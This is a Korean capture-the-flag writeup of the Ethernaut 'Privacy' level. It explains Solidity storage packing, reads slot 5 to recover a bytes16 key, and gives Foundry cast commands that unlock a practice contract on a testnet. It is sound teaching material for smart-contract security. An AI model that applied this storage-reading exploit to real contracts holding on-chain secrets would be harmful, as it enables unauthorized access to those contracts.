---
# Privacy — Ethernaut: Writeup

목표
- `locked` 변수를 `false`로 변경하여 레벨을 통과합니다.

핵심 아이디어
- `unlock(bytes16 _key)` 함수는 내부적으로 `require(_key == bytes16(data[2]))` 를 검사합니다. 즉, `data[2]`의 상위 16바이트를 알면 잠금을 해제할 수 있습니다.

문제 접근법 요약
1. Solidity storage는 32바이트(slot) 단위로 저장됩니다.
2. 고정 크기 변수들은 가능한 경우 같은 슬롯에 packing 되어 저장됩니다.
3. `bytes32[3] private data` 배열의 각 원소는 별도 슬롯(연속 슬롯)에 저장됩니다 — `data[0]`은 slot 3, `data[1]`은 slot 4, `data[2]`은 slot 5에 배치됩니다.
4. 따라서 slot 5의 값을 읽어 `bytes16(data[2])`를 추출하면 됩니다.

문제 코드 (핵심부)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }
}
```

Storage 레이아웃 요약

- slot 0: `locked` (bool) + padding
- slot 1: `ID` (uint256)
- slot 2: `flattening` / `denomination` / `awkwardness` (packed)
- slot 3: `data[0]` (bytes32)
- slot 4: `data[1]` (bytes32)
- slot 5: `data[2]` (bytes32) ← 우리가 찾을 슬롯

실제 값 확인 및 key 추출

1) Etherscan 또는 RPC를 통해 contract creation 트랜잭션의 스토리지 슬롯을 조회합니다. 세폴리아 예시 주소: `0x4633Cf9f28288BF2B642b16CbeE754868cfD17c6` (문서용 예)

2) slot 5의 값(예시):

```
0x892d56cb9428605f10d681882f82818219122848c0a9703426c7bb10e8223007
```

3) unlock에 필요한 key는 `bytes16(data[2])`이므로 상위 16바이트(왼쪽 32문자)만 사용합니다:

```
0x892d56cb9428605f10d681882f828182
```

Exploit (Foundry / cast)

```bash
cast send 0x4633Cf9f28288BF2B642b16CbeE754868cfD17c6 \
  --rpc-url https://eth-sepolia.g.alchemy.com/v2/<ALCHEMY_KEY> \
  --private-key $PRIVATE_KEY \
  "unlock(bytes16)" 0x892d56cb9428605f10d681882f828182
```

검증

```bash
cast call 0x4633Cf9f28288BF2B642b16CbeE754868cfD17c6 \
  --rpc-url https://eth-sepolia.g.alchemy.com/v2/<ALCHEMY_KEY> \
  "locked()(bool)"
```

반환값이 `false`이면 성공입니다.

결론

- `private`로 선언된 데이터도 블록체인에 평문으로 저장되므로, 저장된 스토리지를 직접 읽어 필요한 값을 추출할 수 있습니다.
- 이 문제는 Solidity storage packing 원리와 배열의 슬롯 배치를 이해하면 쉽게 풀이할 수 있습니다.

안전 팁

- 민감한 데이터(키/비밀값 등)는 온체인에 저장하지 마세요. 가능하면 해시나 오프체인 저장소, 또는 암호화된 형태로 보관하세요.


